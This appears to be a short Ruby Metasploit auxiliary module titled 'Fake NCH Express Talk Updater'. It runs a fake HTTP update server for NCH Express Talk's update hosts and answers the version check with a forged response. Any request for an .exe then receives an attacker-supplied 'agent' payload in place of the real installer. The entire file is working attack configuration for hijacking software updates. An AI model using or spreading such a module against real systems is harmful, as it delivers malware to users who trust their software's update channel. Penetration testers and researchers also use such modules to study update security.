require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake NCH Express Talk Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Express Talk updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		@base = {	
			'vh' => ['www.audiochannel.net','www.nch.com'],
			'request' => [{
				'req' => '(/versions/talk.txt)', 
				'type' => 'string', 
				'bin'    => 0,
				'string' => "version=3.20&info=http://www.nch.com.au/talk/versions.html&download=http://www.nch.com.au/components/talksetup.exe",
				'parse' => 1,
				'file' => '',
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {
			}
		}
	end
end
